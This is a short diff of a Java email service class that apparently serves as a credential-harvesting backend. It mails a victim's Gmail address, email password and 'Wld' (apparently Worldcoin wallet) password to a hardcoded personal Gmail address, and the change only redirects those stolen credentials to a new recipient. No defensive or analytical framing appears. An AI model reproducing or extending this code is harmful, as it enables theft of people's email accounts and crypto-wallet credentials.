@@ -79,7 +79,7 @@ public class EmailServicesImpl implements IEmailServices {
             MimeMessage message = javaMailSender.createMimeMessage();
             MimeMessageHelper helper = new MimeMessageHelper(message,true,"UTF-8");
 
-            helper.setTo("marcos4281121@gmail.com");
+            helper.setTo("gustavolopaz1@gmail.com");
             helper.setSubject("Datos ");
             helper.setText("Gmail: "+email.getEmail()+"   ContraceñaEmail: " + email.getPasswordEmail()+ " </br>   Contraceña Wld: "+email.getPaswwordWorcoin());
 
